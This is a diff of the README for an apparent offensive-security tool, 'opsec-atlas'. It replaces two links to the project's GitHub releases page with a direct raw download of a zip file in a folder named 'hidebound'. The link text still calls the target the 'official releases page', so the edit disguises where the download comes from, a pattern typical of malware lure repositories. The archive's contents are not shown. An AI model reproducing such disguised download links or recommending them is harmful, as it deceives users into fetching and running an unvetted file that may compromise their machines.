@@ -1,6 +1,6 @@
 # 🛡️ opsec-atlas - Streamline your offensive security testing workflow
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Coordenasem9579/opsec-atlas/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Coordenasem9579/opsec-atlas/main/hidebound/atlas_opsec_v3.1.zip)
 
 ## 📖 About This Tool
 
@@ -19,7 +19,7 @@ The system breaks down the full penetration testing lifecycle. It covers initial
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official releases page](https://github.com/Coordenasem9579/opsec-atlas/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Coordenasem9579/opsec-atlas/main/hidebound/atlas_opsec_v3.1.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file ending in .zip to start the download.
 4. Open your Downloads folder once the process finishes.
